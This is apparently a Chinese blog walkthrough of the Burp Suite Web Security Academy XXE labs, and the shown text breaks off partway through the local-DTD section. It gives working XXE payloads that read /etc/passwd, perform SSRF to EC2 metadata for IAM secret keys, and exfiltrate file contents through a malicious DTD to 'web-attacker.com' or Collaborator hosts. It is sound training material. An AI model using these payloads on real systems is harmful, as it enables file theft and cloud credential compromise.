# 原创
：  【burpsuite安全练兵场-服务端10】XML外部实体注入（XXE注入）-9个实验（全）

# 【burpsuite安全练兵场-服务端10】XML外部实体注入（XXE注入）-9个实验（全）

  <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）利用XXE检索文件（√）
（2）利用XXE进行SSRF攻击（√）
（3）盲XXE漏洞（√）
（4）查找XXE注入的隐藏攻击面（√）
（5）查找和测试XXE漏洞（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

---


**目录**

[一、XML外部实体（XXE）注入](#%E4%B8%80%E3%80%81XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%EF%BC%88XXE%EF%BC%89%E6%B3%A8%E5%85%A5)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、产生](#2%E3%80%81%E4%BA%A7%E7%94%9F)

[ 3、XXE攻击类型](#%C2%A03%E3%80%81XXE%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B)

[二、利用XXE检索文件](#%E4%BA%8C%E3%80%81%E5%88%A9%E7%94%A8XXE%E6%A3%80%E7%B4%A2%E6%96%87%E4%BB%B6)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[        ](#%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E5%88%A9%E7%94%A8XXE%E4%BD%BF%E7%94%A8%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%A3%80%E7%B4%A2%E6%96%87%E4%BB%B6)[实验1：利用XXE使用外部实体检索文件](#%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E5%88%A9%E7%94%A8XXE%E4%BD%BF%E7%94%A8%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%A3%80%E7%B4%A2%E6%96%87%E4%BB%B6)

[三、利用XXE进行SSRF攻击](#%E4%B8%89%E3%80%81%E5%88%A9%E7%94%A8XXE%E8%BF%9B%E8%A1%8CSSRF%E6%94%BB%E5%87%BB)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[        ](#%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E5%88%A9%E7%94%A8XXE%E8%BF%9B%E8%A1%8CSSRF%E6%94%BB%E5%87%BB)[实验2：利用XXE进行SSRF攻击](#%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E5%88%A9%E7%94%A8XXE%E8%BF%9B%E8%A1%8CSSRF%E6%94%BB%E5%87%BB)

[四、盲XXE漏洞](#%E5%9B%9B%E3%80%81%E7%9B%B2XXE%E6%BC%8F%E6%B4%9E)

[1、简述（查找和利用隐蔽的XXE漏洞）：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%88%E6%9F%A5%E6%89%BE%E5%92%8C%E5%88%A9%E7%94%A8%E9%9A%90%E8%94%BD%E7%9A%84XXE%E6%BC%8F%E6%B4%9E%EF%BC%89%EF%BC%9A)

[2、XXE盲注](#2%E3%80%81XXE%E7%9B%B2%E6%B3%A8)

[3、使用带外技术](#3%E3%80%81%E4%BD%BF%E7%94%A8%E5%B8%A6%E5%A4%96%EF%BC%88%EF%BC%89%E6%8A%80%E6%9C%AF)

[        ](#%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%B8%A6%E5%A4%96%E4%BA%A4%E4%BA%92%E7%9A%84%E7%9B%B2XXE)[实验3：带外交互的盲XXE](#%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%B8%A6%E5%A4%96%E4%BA%A4%E4%BA%92%E7%9A%84%E7%9B%B2XXE)

[        ](#%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E9%80%9A%E8%BF%87XML%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93%E8%BF%9B%E8%A1%8C%E5%B8%A6%E5%A4%96%E4%BA%A4%E4%BA%92%E7%9A%84%E7%9B%B2XXE)[实验4：通过XML参数实体进行带外交互的盲XXE](#%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E9%80%9A%E8%BF%87XML%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93%E8%BF%9B%E8%A1%8C%E5%B8%A6%E5%A4%96%E4%BA%A4%E4%BA%92%E7%9A%84%E7%9B%B2XXE)

[4、利用盲XXE将数据渗透到带外](#4%E3%80%81%E5%88%A9%E7%94%A8%E7%9B%B2XXE%E5%B0%86%E6%95%B0%E6%8D%AE%E6%B8%97%E9%80%8F%E5%88%B0%E5%B8%A6%E5%A4%96)

[        ](#%E5%AE%9E%E9%AA%8C5%EF%BC%9A%E5%88%A9%E7%94%A8XXE%E7%9B%B2%E6%B3%A8%E4%BD%BF%E7%94%A8%E6%81%B6%E6%84%8F%E5%A4%96%E9%83%A8DTD%E6%B3%84%E6%BC%8F%E6%95%B0%E6%8D%AE)[实验5：利用XXE盲注使用恶意外部DTD泄漏数据](#%E5%AE%9E%E9%AA%8C5%EF%BC%9A%E5%88%A9%E7%94%A8XXE%E7%9B%B2%E6%B3%A8%E4%BD%BF%E7%94%A8%E6%81%B6%E6%84%8F%E5%A4%96%E9%83%A8DTD%E6%B3%84%E6%BC%8F%E6%95%B0%E6%8D%AE)

[5、利用盲态XXE通过错误消息检索数据](#5%E3%80%81%E5%88%A9%E7%94%A8%E7%9B%B2%E6%80%81XXE%E9%80%9A%E8%BF%87%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF%E6%A3%80%E7%B4%A2%E6%95%B0%E6%8D%AE)

[        ](#%E5%AE%9E%E9%AA%8C6%EF%BC%9A%E5%88%A9%E7%94%A8%E7%9B%B2%E6%80%81XXE%E9%80%9A%E8%BF%87%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF%E6%A3%80%E7%B4%A2%E6%95%B0%E6%8D%AE)[实验6：利用盲态XXE通过错误消息检索数据](#%E5%AE%9E%E9%AA%8C6%EF%BC%9A%E5%88%A9%E7%94%A8%E7%9B%B2%E6%80%81XXE%E9%80%9A%E8%BF%87%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF%E6%A3%80%E7%B4%A2%E6%95%B0%E6%8D%AE)

[ 6、通过改变本地DTD的用途来利用盲XXE](#%C2%A06%E3%80%81%E9%80%9A%E8%BF%87%E6%94%B9%E5%8F%98%E6%9C%AC%E5%9C%B0DTD%E7%9A%84%E7%94%A8%E9%80%94%E6%9D%A5%E5%88%A9%E7%94%A8%E7%9B%B2XXE)

[        ](#%E5%AE%9E%E9%AA%8C9%EF%BC%9A%E5%88%A9%E7%94%A8XXE%E9%80%9A%E8%BF%87%E6%94%B9%E5%8F%98%E6%9C%AC%E5%9C%B0DTD%E7%9A%84%E7%94%A8%E9%80%94%E6%9D%A5%E6%A3%80%E7%B4%A2%E6%95%B0%E6%8D%AE)[实验9：利用XXE通过改变本地DTD的用途来检索数据](#%E5%AE%9E%E9%AA%8C9%EF%BC%9A%E5%88%A9%E7%94%A8XXE%E9%80%9A%E8%BF%87%E6%94%B9%E5%8F%98%E6%9C%AC%E5%9C%B0DTD%E7%9A%84%E7%94%A8%E9%80%94%E6%9D%A5%E6%A3%80%E7%B4%A2%E6%95%B0%E6%8D%AE)

[五、查找XXE注入的隐藏攻击面](#%E4%BA%94%E3%80%81%E6%9F%A5%E6%89%BEXXE%E6%B3%A8%E5%85%A5%E7%9A%84%E9%9A%90%E8%97%8F%E6%94%BB%E5%87%BB%E9%9D%A2)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、XInclude攻击](#2%E3%80%81XInclude%E6%94%BB%E5%87%BB)

[        ](#%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E5%88%A9%E7%94%A8XInclude%E6%A3%80%E7%B4%A2%E6%96%87%E4%BB%B6)[实验7：利用XInclude检索文件](#%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E5%88%A9%E7%94%A8XInclude%E6%A3%80%E7%B4%A2%E6%96%87%E4%BB%B6)

[3、通过文件上传进行XXE攻击](#3%E3%80%81%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB)

[        ](#%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E9%80%9A%E8%BF%87%E5%9B%BE%E5%83%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8XXE)[实验8：通过图像文件上传利用XXE](#%E5%AE%9E%E9%AA%8C8%EF%BC%9A%E9%80%9A%E8%BF%87%E5%9B%BE%E5%83%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8XXE)

[4、通过修改内容类型的XXE攻击](#4%E3%80%81%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9%E5%86%85%E5%AE%B9%E7%B1%BB%E5%9E%8B%E7%9A%84XXE%E6%94%BB%E5%87%BB)

[六、查找和测试XXE漏洞](#%E5%85%AD%E3%80%81%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B5%8B%E8%AF%95XXE%E6%BC%8F%E6%B4%9E)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

---


## <br/>一、XML外部实体（XXE）注入

> 
<h3>1、简述：</h3>
1、XML外部实体注入（也称为XXE）是一个Web安全漏洞，使得攻击者能够干扰应用程序对XML数据的处理。它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互。
<hr/>
2、在某些情况下，攻击者可以利用XXE漏洞执行攻击，从而升级XXE攻击，危害底层服务器或其他后端基础架构服务器端请求伪造（SSRF）攻击。 


> 
<h3>2、产生</h3>
1、某些应用程序使用XML格式在浏览器和服务器之间传输数据。这样做的应用程序实际上总是使用标准库或平台API来处理服务器上的XML数据。XXE漏洞的出现是因为XML规范包含各种潜在的危险特性，而标准解析器支持这些特性，即使应用程序通常不使用这些特性。
<hr/>
2、XML外部实体是一种自定义XML实体，其定义值从声明它们的DTD外部加载。从安全性的角度来看，外部实体特别重要，因为它们允许基于文件路径或URL的内容定义实体。


> 
<h3> 3、XXE攻击类型</h3>
<pre><code>1、利用XXE检索文件，其中定义了包含文件内容的外部实体，并在应用程序的响应中返回。
2、利用XXE执行SSRF攻击，其中外部实体是基于到后端系统的URL定义的。
3、利用隐蔽XXE会将数据泄露到带外，将敏感数据从应用程序服务器传输到攻击者控制的系统。
4、利用blind XXE通过错误消息检索数据，攻击者可以触发包含敏感数据的解析错误消息。 
</code></pre>



---


---


## 二、利用XXE检索文件

> 
<h3>1、简述：</h3>
1、要执行从服务器文件系统检索任意文件的XXE注入攻击，需要以两种方式修改提交的XML：
<pre><code>    1、引入（或编辑）DOCTYPE元素，该元素定义包含文件路径的外部实体。
    2、编辑应用程序响应中返回的XML中的数据值，以使用定义的外部实体。</code></pre>
<hr/>
2、对于现实世界中的XXE漏洞，提交的XML中通常会有大量的数据值，其中任何一个都可能在应用程序的响应中使用。要系统地测试XXE漏洞，通常需要单独测试XML中的每个数据节点，方法是使用定义的实体并查看它是否出现在响应中。 
<hr/>
3、如购物应用程序通过向服务器提交以下XML来检查产品的库存水平：
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;stockCheck&gt;&lt;productId&gt;381&lt;/productId&gt;&lt;/stockCheck&gt;</code></pre>
若应用程序对XXE攻击不执行任何特定的防御，因此可以通过提交以下XXE有效负载来利用XXE漏洞检索/etc/passwd文件：
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;</code></pre>
 此XXE有效负载定义外部实体&amp;xxe，其值为/etc/passwd文件中的实体并使用产品ID值。这将导致应用程序的响应包含文件的内容：<br/>  
<pre><code>Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...</code></pre>
<hr/>
4、涉及实验：<br/> 实验1：利用XXE使用外部实体检索文件


---


> 
<h3>实验1：利用XXE使用外部实体检索文件</h3>
信息：
本实验有一个“Check stock”特性，它解析XML输入并在响应中返回任何意外值。
要解决实验：注入一个XML外部实体来检索/etc/passwd文件的内容
<hr/>
part1:
访问一个产品页面，点击"检查库存"，并在Burp Suite中拦截由此产生的POST请求，发送到repeater



<hr/>
part2:
XXE注入
在XML声明和stockCheck元素之间插入以下外部实体定义：
<pre>`&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;`</pre>

 将productId编号替换为对外部实体的引用：
<pre>`&amp;xxe;`</pre>


响应应包含"Invalid product ID:"，后跟/etc/passwd文件的内容




---


## 三、利用XXE进行SSRF攻击

> 
<h3>1、简述：</h3>
1、除了检索敏感数据之外，XXE攻击的另一个主要影响是它们可用于执行服务器端请求伪造SSRF。这是一个潜在的严重漏洞，可诱使服务器端应用程序向服务器可以访问的任何URL发出HTTP请求。
<hr/>
2、要利用XXE漏洞执行SSRF攻击，需要使用要攻击的URL定义外部XML实体，并在数据值中使用定义的实体。如果可以在应用程序响应中返回的数据值中使用定义的实体，那么将能够从应用程序响应中的URL查看响应，从而获得与后端系统的双向交互。如果没有，那么将只能进行SSRF的盲攻击
<hr/>
3、XXE示例：外部实体将导致服务器向组织基础架构中的内部系统发出后端HTTP请求：
<pre>`&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"&gt; ]&gt;`</pre>
<hr/>
4、涉及实验：<br/> 实验2：利用XXE进行SSRF攻击


---


> 
<h3>实验2：利用XXE进行SSRF攻击</h3>
信息：
本实验有一个"Check stock"特性，它解析XML输入并在响应中返回任何意外值
实验室服务器在默认URL（www.example.com）上运行（模拟的）EC2元数据端点http://169.254.169.254/。此终结点可用于检索有关实例的数据，其中一些数据可能是敏感的
解决实验：利用XXE漏洞执行SSRF攻击，从EC2元数据端点获取服务器的IAM秘密访问密钥
<hr/>
part1:
访问一个产品页面，点击"检查库存"，并在Burp Suite中拦截由此产生的POST请求，并发送到repeater

<hr/>

part2：
XXE注入
在XML声明和stockCheck元素之间插入以下外部实体定义：
<pre>`&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/"&gt; ]&gt;`</pre>
将 productId 号替换为对外部实体的引用:
<pre>`&amp;xxe;`</pre>
响应应包含"Invalid product ID:"，后跟来自元数据端点的响应，该响应最初将是文件夹名称


<hr/>
part3：
完成实验<br/> 迭代更新DTD中的URL以浏览API，直接到达
<pre>`/latest/meta-data/iam/security-credentials/admin`</pre>
这应该返回包含SecretAccessKey的JSON

 <img alt="" height="430" src="https://img-blog.csdnimg.cn/bb2676b1cfd043cb8d06b24bde0881cf.png" width="1200"/>



---


## 四、盲XXE漏洞

> 
<h3>1、简述（查找和利用隐蔽的XXE漏洞）：</h3>
1、XXE漏洞的许多实例是盲目的。这意味着应用程序不会在其响应中返回任何已定义的外部实体的值，因此不可能直接检索服务器端文件。
<hr/>
2、盲XXE漏洞仍然可以检测和利用，但需要更先进的技术。有时可以使用带外技术来查找漏洞，并利用它们来泄漏数据。有时候，可能会触发XML解析错误，从而导致在错误消息中泄漏敏感数据。 


> 
<h3>2、XXE盲注</h3>
1、Blind XXE漏洞出现在应用程序易受攻击的地方XXE注射液但不在其响应内返回任何定义的外部实体的值。这意味着直接检索服务器端文件是不可能的，因此盲XXE通常比常规XXE漏洞更难被利用。
<pre><code>可以通过两种广泛的方式查找和利用隐蔽的XXE漏洞：
    1、触发带外网络交互，有时会在交互数据中泄漏敏感数据。
    2、通过错误消息包含敏感数据的方式触发XML解析错误。</code></pre>



> 
<h3>3、使用带外技术</h3>
1、通常可以使用与XXE SSRF攻击相同的技术来检测XXE盲注，但会触发与控制的系统的带外网络交互。
<pre><code>例如，可按如下方式定义外部：
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"&gt; ]&gt;
将在XML中的数据值中使用定义的实体</code></pre>
此XXE攻击使服务器向指定URL发出后端HTTP请求。攻击者可以监视生成的DNS查找和HTTP请求，从而检测到XXE攻击成功。<br/> ————
2、涉及实验：<br/> 实验3：带外交互的盲XXE
<hr/>
3、一般使用常规实体的XXE攻击会被阻止，因为应用程序进行了一些输入验证，或者使用的XML解析器进行了一些加固。在这种情况下，可以改用XML参数实体。
XML参数实体是一种特殊类型的XML实体，只能在DTD中的其他位置引用
1）XML参数实体的声明在实体名称前包含百分比字符：
<pre>`&lt;!ENTITY % myparameterentity "my parameter entity value" &gt;`</pre>
2）使用%百分比字符而不是通常的&amp;号引用参数实体：
<pre>`%myparameterentity;`</pre>
3）XML参数实体使用带外检测来测试盲XXE：
<pre>`&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"&gt; %xxe; ]&gt;`</pre>
此XXE有效负载声明一个名为xxe然后使用DTD中的实体。这将导致向攻击者的域发出DNS查找和HTTP请求，从而验证攻击是否成功
————
4、涉及实验：<br/> 实验4：通过XML参数实体进行带外交互的盲XXE


<br/>  

> 
<h3>实验3：带外交互的盲XXE</h3>
信息：
本实验有一个"Check stock"（检查库存）功能，该功能可以解析XML输入，但不显示结果。
可以通过触发与外部域的带外交互来检测隐蔽XXE漏洞。
解决实验：使用外部实体使XML解析器向Burp Collaborator发出DNS查找和HTTP请求
<hr/>
part1:
访问一个产品页面，点击"检查库存"，并使用BP拦截产生的POST请求，并发送到repeater



<hr/>
part2:
XXE注入
BP---BC客户端---“Copy to clipboard”负载复制到剪贴板（客户端窗口保持打开状态）


<pre>`4rwfonp4gqw9xc6pfy7unaght8zynn.burpcollaborator.net`</pre>
在XML声明和stockCheck元素之间插入以下外部实体定义
<pre><code>&lt;!DOCTYPE stockCheck [ &lt;!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"&gt; ]&gt;

我的是：
&lt;!DOCTYPE stockCheck [ &lt;!ENTITY xxe SYSTEM "http://4rwfonp4gqw9xc6pfy7unaght8zynn.burpcollaborator.net"&gt; ]&gt;</code></pre>
将productId编号替换为对外部实体的引用：
<pre>`&amp;xxe;`</pre>



<br/> 转到Collaborator选项卡，刷新看到一些DNS和HTTP交互，这些交互是应用程序由于负载而启动的




---


<br/>  

> 
<h3>实验4：通过XML参数实体进行带外交互的盲XXE</h3>
信息：
本实验有一个“Check stock”功能，该功能可以解析XML输入，但不会显示任何意外值，并阻止包含常规外部实体的请求
解决实验：使用一个参数实体使XML解析器向Burp Collaborator发出DNS查找和HTTP请求
<hr/>
part1:
 访问一个产品页面，点击"检查库存"，并使用BP拦截产生的POST请求，并发送到repeater


<hr/>
part2:
XXE注入
BP---BC客户端---“Copy to clipboard”负载复制到剪贴板（客户端窗口保持打开状态）


<pre>`6bivukzadf4nrcnuu14gcp6kibo1cq.burpcollaborator.net`</pre>
在XML声明和stockCheck元素之间插入以下外部实体定义
<pre><code>&lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"&gt; %xxe; ]&gt;



我的是：
&lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM "http://6bivukzadf4nrcnuu14gcp6kibo1cq.burpcollaborator.net"&gt; %xxe; ]&gt;

</code></pre>


<br/> 转到Collaborator选项卡，刷新看到一些DNS和HTTP交互，这些交互是应用程序由于负载而启动的







---


> 
<h3>4、利用盲XXE将数据渗透到带外</h3>
1、通过带外技术检测一个隐蔽的XXE漏洞是非常好的，但它实际上并不能证明该漏洞是如何被利用的。攻击者真正想要实现的是泄露敏感数据。这可以通过隐蔽的XXE漏洞实现，但它涉及攻击者在其控制的系统上托管恶意DTD，然后从带内XXE有效负载内调用外部DTD。
<pre><code>一个恶意DTD的示例，该DTD可用于泄漏/etc/passwd文件的内容：
&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'&gt;"&gt;
%eval;
%exfiltrate;

此DTD执行以下步骤：
    1、定义名为的XML参数实体file，包含的内容/etc/passwd文件。
    2、定义名为的XML参数实体eval，包含另一个XML参数实体的动态声明，该实体名为exfiltrate。该exfiltrate将通过向攻击者的Web服务器发出包含file URL查询字符串中的实体。
    3、使用eval实体的动态声明，它将导致exfiltrate要执行的实体。
    4、使用exfiltrate实体，以便通过请求指定的URL来计算其值。</code></pre>
2、然后攻击者必须在他们控制的系统上托管恶意DTD，通常是将其加载到自己的Web服务器上。
<pre><code>例如，攻击者可能在以下URL提供恶意DTD：
http://web-attacker.com/malicious.dtd</code></pre>
3、最后攻击者必须向易受攻击的应用程序提交以下XXE有效负载：
<pre><code>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"&gt; %xxe;]&gt;</code></pre>
4、这个XXE有效负载声明了一个名为xxe的XML参数实体，然后在DTD中使用该实体。这将导致XML解析器从攻击者的服务器获取外部DTD并内联解释它。然后执行恶意DTD中定义的步骤，并将/etc/passwd文件传输到攻击者的服务器。
<hr/>
5、此技术可能不适用于某些文件内容，包括/etc/passwd文件中包含的换行符。因为一些XML解析器使用API来获取外部实体定义中的URL，该API验证允许出现在URL中的字符。在这种情况下，可以使用FTP协议代替HTTP。有时无法过滤包含换行符的数据，因此可以将目标改为/etc/hostname之类的文件<br/>  
<hr/>
6、涉及实验：<br/> 实验5：利用XXE盲注使用恶意外部DTD泄漏数据


---


> 
<h3>实验5：利用XXE盲注使用恶意外部DTD泄漏数据</h3>
信息：
本实验有一个"Check stock"（检查库存）功能，该功能可以解析XML输入，但不显示结果。
要解决实验问题，请将/etc/hostname文件的内容导出。
<hr/>
part1:
 访问一个产品页面，点击"检查库存"，并使用BP拦截产生的POST请求，并发送到repeater



<hr/>
part2:
上传DTD文件
BP---BC客户端---“Copy to clipboard”负载复制到剪贴板（客户端窗口保持打开状态）


<pre>`hwh2go56nreqc4j22wrj7aguzl5bt0.burpcollaborator.net`</pre>
单击"Go to exploit server"（转到利用漏洞服务器）并将恶意DTD文件保存在您的服务器上。
<pre><code>将Burp Collaborator有效负载放入恶意DTD文件：
&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://hwh2go56nreqc4j22wrj7aguzl5bt0.burpcollaborator.net/?x=%file;'&gt;"&gt;
%eval;
%exfil;

</code></pre>

单机Store上传到服务器（本人测试，后缀加不加DTD都可以被识别出来）


单击"view exploit"并记下URL（直接上传后有显示）
<pre>`https://exploit-0a86000303a98408c5b231d30145003d.exploit-server.net/exploit.dtd`</pre>


<hr/>
part3：
XXE注入
在XML声明和stockCheck元素之间插入以下外部实体定义：
<pre><code>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "YOUR-DTD-URL"&gt; %xxe;]&gt;

我的是：
&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "https://exploit-0a86000303a98408c5b231d30145003d.exploit-server.net/exploit.dtd"&gt; %xxe;]&gt;</code></pre>
 <img alt="" height="931" src="https://img-blog.csdnimg.cn/5c2bb709fda6403c86c76a91b65379f9.png" width="1200"/>


<hr/>
part4
完成实验<br/> 转到Collaborator选项卡，刷新看到一些DNS和HTTP交互，这些交互是应用程序由于负载而启动的



HTTP交互可以包含/etc/hostname文件的内容 




---


---


> 
<h3>5、利用盲态XXE通过错误消息检索数据</h3>
1、利用盲XXE的另一种方法是触发XML解析错误，其中错误消息包含希望检索的敏感数据。如果应用程序在其响应中返回结果错误消息，则此操作将有效。
<pre><code>可以触发一条XML分析错误消息，该消息包含/etc/密码文件使用恶意外部DTD：
&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
%eval;
%error;

此DTD执行以下步骤：
    1、定义名为的XML参数实体file，包含的内容/etc/passwd文件。
    2、定义名为的XML参数实体eval，包含另一个XML参数实体的动态声明，该实体名为error。该error将通过加载一个不存在的文件（该文件的名称包含file实体。
    3、使用eval实体的动态声明，它将导致error要执行的实体。
    4、使用error实体，以便通过尝试加载不存在的文件来计算其值，从而生成包含不存在的文件的名称的错误消息，该文件是/etc/passwd文件。</code></pre>

2、调用恶意的外部DTD将导致出现如下错误消息：
<pre><code>java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...</code></pre>
<hr/>
3、涉及实验：<br/> 实验6：利用盲态XXE通过错误消息检索数据


> 
<h3>实验6：利用盲态XXE通过错误消息检索数据</h3>
信息：
本实验有一个"Check stock"（检查库存）功能，该功能可以解析XML输入，但不显示结果。
解决实验：使用外部DTD触发错误消息，以显示/etc/passwd文件的内容。
本实验包含一个链接，该链接指向可托管恶意DTD的其他域中的漏洞攻击服务器。
<hr/>
part1:
 访问一个产品页面，点击"检查库存"，并使用BP拦截产生的POST请求，并发送到repeater




<hr/>
part2:
上传DTD文件

单击"Go to exploit server"（转到利用漏洞服务器）并将恶意DTD文件保存在您的服务器上。
<pre><code>上传恶意DTD文件：
&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'file:///invalid/%file;'&gt;"&gt;
%eval;
%exfil;

</code></pre>

单机Store上传到服务器（本人测试，后缀加不加DTD都可以被识别出来）



单击"view exploit"并记下URL（直接上传后有显示）
<pre>`https://exploit-0a7300340350f0ddc06167d1015f002c.exploit-server.net/exploit`</pre>


<hr/>
part3：
XXE注入
在XML声明和stockCheck元素之间插入以下外部实体定义：
<pre><code>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "YOUR-DTD-URL"&gt; %xxe;]&gt;

我的是：
&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "https://exploit-0a7300340350f0ddc06167d1015f002c.exploit-server.net/exploit"&gt; %xxe;]&gt;</code></pre>
 看到一条错误消息，其中包含/etc/passwd文件的内容<img alt="" height="938" src="https://img-blog.csdnimg.cn/703e674a8969485fb665b4e1af83c705.png" width="1200"/>
 <img alt="" height="427" src="https://img-blog.csdnimg.cn/5f259c89426c4390b31530b0129235b2.png" width="1200"/>



---


> 
<h3> 6、通过改变本地DTD的用途来利用盲XXE</h3>
1、前面的技术可以很好地用于外部DTD，但通常不能用于在文件`DOCTYPE`元素。因为该技术涉及在另一个参数实体的定义中使用XML参数实体。根据XML规范，这在外部DTD中是允许的，但在内部DTD中不允许。(大多数解析器不会允许）
<hr/>
2、当带外交互被阻止时，不能通过带外连接泄漏数据，也不能从远程服务器加载外部DTD。在这种情况下，由于XML语言规范中的漏洞，仍然可能触发包含敏感数据的错误消息。如果文档的DTD混合使用内部和外部DTD声明，则内部DTD可以重定义在外部DTD中声明的实体。当发生这种情况时，对在另一个参数实体的定义中使用XML参数实体的限制就会放松
<hr/>
3、意味着攻击者可以使用基于误差的XXE技术（error-based XXE ），前提是它们使用的XML参数实体是重新定义在外部DTD中声明的实体。当然，如果阻塞了带外连接，则无法从远程位置加载外部DTD。相反，它需要是应用程序服务器本地的外部DTD文件。从本质上讲，攻击涉及调用一个碰巧存在于本地文件系统上的DTD文件，并重新调整其用途，以触发包含敏感数据的解析错误的方式重新定义现有实体。
<hr/>
4、例如，假设服务器文件系统上的以下位置有一个DTD文件/usr/local/app/schema.dtd，并且此DTD文件定义了一个名为custom_entity。
<pre><code>攻击者可以触发XML解析错误消息，该消息包含/etc/passwd文件，方法是提交如下所示的混合DTD： 
